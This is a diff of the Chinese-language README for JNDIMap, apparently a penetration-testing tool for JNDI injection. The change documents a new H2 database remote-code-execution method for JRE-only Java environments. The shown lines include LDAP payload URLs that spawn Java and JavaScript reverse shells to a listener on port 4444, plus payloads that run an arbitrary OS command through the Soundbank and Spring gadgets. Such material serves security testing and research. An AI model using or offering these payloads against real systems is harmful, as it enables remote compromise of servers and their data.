@@ -260,12 +260,15 @@ ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
 ```
 
-此外, JNDIMap 还支持**JRE 环境**的 H2 RCE (基于 ClassPathXmlApplicationContext, 需要 Spring 依赖)
+此外, JNDIMap 还支持 **JRE** 环境的 H2 RCE
 
-*Java 15 及以上版本删除了 Nashorn JS 引擎, 同时 JRE 环境本身不包含 javac 命令, 因此无法使用上述 Java/JavaScript 方式实现 RCE*
+*Java 15 及以上版本删除了 Nashorn JS 引擎, 同时 JRE 环境本身不包含 javac 命令, 因此无法使用 Java/JavaScript 方式实现 RCE*
 
 ```bash
-# JRE 命令执行
+# 基于 MidiSystem.getSoundbank 方法, 仅需 JRE + H2 依赖
+ldap://127.0.0.1:1389/Factory/H2/JRE/Soundbank/Command/open -a Calculator
+
+# 基于 ClassPathXmlApplicationContext, 需要 Spring 依赖
 ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/Command/open -a Calculator
 ```
 
@@ -506,3 +509,5 @@ java -jar JNDIMap.jar -useReferenceOnly
 [https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html](https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html)
 
 [https://exp10it.io/2025/03/h2-rce-in-jre-17/](https://exp10it.io/2025/03/h2-rce-in-jre-17/)
+
+[https://forum.butian.net/share/4414](https://forum.butian.net/share/4414)
